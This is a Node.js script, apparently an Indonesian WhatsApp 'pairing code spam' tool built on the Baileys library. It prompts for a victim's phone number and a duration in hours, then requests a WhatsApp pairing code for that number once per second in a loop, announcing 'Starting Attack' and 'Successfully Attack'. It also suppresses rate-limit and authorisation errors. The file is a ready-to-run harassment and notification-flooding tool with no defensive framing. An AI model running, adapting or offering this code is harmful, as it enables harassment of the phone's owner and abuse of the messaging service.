const pino = require("pino");
const fs = require('fs');
const chalk = require("chalk");
const readline = require("readline");
const {
  default: spamConnect,
  PHONENUMBER_MCC,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  makeInMemoryStore,
  Browsers
} = require("@whiskeysockets/baileys");
const NodeCache = require("node-cache");

const store = makeInMemoryStore({
  logger: pino().child({ level: "silent", stream: "store" }),
});

const pairingCode = true || process.argv.includes("--pairing-code");
const useMobile = process.argv.includes("--mobile");
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function startspam() {
  const { version, isLatest } = await fetchLatestBaileysVersion();
  const { state, saveCreds } = await useMultiFileAuthState("./cassaster");
  const msgRetryCounterCache = new NodeCache();

  const spam = spamConnect({
    logger: pino({ level: "silent" }),
    printQRInTerminal: !pairingCode,
    browser: Browsers.windows("Firefox"),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(
        state.keys,
        pino({ level: "fatal" }).child({ level: "fatal" })
      ),
    },
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg?.message || undefined;
      }
      return { conversation: "SPAM PAIRING CODE" };
    },
    msgRetryCounterCache,
    defaultQueryTimeoutMs: undefined,
  });

  store.bind(spam.ev);

  if (pairingCode && !spam.authState.creds.registered) {
    if (useMobile) {
      throw new Error("Tidak dapat menggunakan kode pasangan dengan API seluler");
    }

    let phoneNumber = process.argv[2]?.replace(/[^0-9]/g, '');

    while (!Object.keys(PHONENUMBER_MCC).some((v) => phoneNumber.startsWith(v))) {
      console.log(chalk.bgBlack(chalk.yellowBright("Input nomor dalam format yang benar")));
      phoneNumber = await question(
        chalk.bgBlack(chalk.greenBright("Input NO Whatsapp: +628xxx : "))
      );
    }

    const spamCount = await new Promise((resolve) => {
      console.log(chalk.bgBlack(chalk.whiteBright("Starting Attack.....")));
      setTimeout(() => resolve(1), 1000);
    });

    for (let i = 0; i < spamCount; i++) {
      let second = process.argv[3] * 3600;
      while (second > 0) {
        let code = await spam.requestPairingCode(phoneNumber);
        code = code?.match(/.{1,4}/g)?.join('-') || code;
        await new Promise((resolve) => setTimeout(resolve, 1000));
        second--;
      }
      console.log("Successfully Attack");
      process.exit(0);
      await new Promise((resolve) => setTimeout(resolve, 30000));
    }

    console.log(
      chalk.bgBlack(chalk.greenBright(`Spam selesai sebanyak ${spamCount} kali.`))
    );
  }

  fs.watchFile(require.resolve(__filename), () => {
    fs.unwatchFile(require.resolve(__filename));
    console.log(chalk.redBright("Update " + __filename));
    delete require.cache[require.resolve(__filename)];
    require(require.resolve(__filename));
  });
}

startspam();

process.on("uncaughtexception", function (err) {
  const ignoreErrors = [
    "conflict",
    "Socket connection timeout",
    "not-authorized",
    "already-exists",
    "rate-overlimit",
    "Connection Closed",
    "Timed Out",
    "Value not found",
  ];

  if (!ignoreErrors.some((msg) => String(err).includes(msg))) {
    console.log("Caught exception: ", err);
  }
});

